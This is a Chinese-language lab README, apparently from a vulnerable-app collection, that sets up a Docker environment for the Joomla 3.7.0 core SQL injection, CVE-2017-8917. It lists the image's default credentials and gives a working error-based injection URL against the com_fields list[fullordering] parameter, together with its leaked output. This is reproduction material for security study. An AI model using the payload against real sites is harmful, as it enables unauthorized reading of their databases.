Joomla! 3.7.0 Core SQL Injection (CVE-2017-8917)
---

### 漏洞信息

Joomla于5月17日发布了新版本3.7.1,（(Joomla! 3.7.1 Release News)[https://www.joomla.org/announcements/release-news/5705-joomla-3-7-1-release.html]），本次更新中修复一个高危SQL注入漏洞（[[20170501] - Core - SQL Injection](https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html))，成功利用该漏洞后攻击者可以在未授权的情况下进行SQL注入。

详细参考：[Joomla! 3.7 Core SQL Injection (CVE-2017-8917)](https://www.seebug.org/vuldb/ssvid-93113)

### 镜像信息

类型 | 用户名 | 密码
:-:|:-:|:-:
Mysql | root | root
/administrator/ | admin | admin123


### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:j_joomla_2
 ```

2. 启动环境

 ```
$ docker run -d -p 8000:80 medicean/vulapps:j_joomla_2
 ```
 > `-p 8000:80` 前面的 8000 代表物理机的端口，可随意指定。 

### 使用与利用

访问 `http://你的 IP 地址:端口号/`

### PoC 使用

```
http://你的 IP 地址:端口号/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x3a,concat(1,(select%20md5(1))),1)
```

看到结果成功执行了 `select md5(1)`：

```
If difficulties persist, please contact the System Administrator of this site and report the error below.

500 XPATH syntax error: 'c4ca4238a0b923820dcc509a6f75849b'
```

### 相关链接

* [SQL Injection Vulnerability in Joomla! 3.7](https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html)
* [Joomla! 3.7 Core SQL Injection (CVE-2017-8917)](https://www.seebug.org/vuldb/ssvid-93113)
* [[20170501] - Core - SQL Injection](https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html)
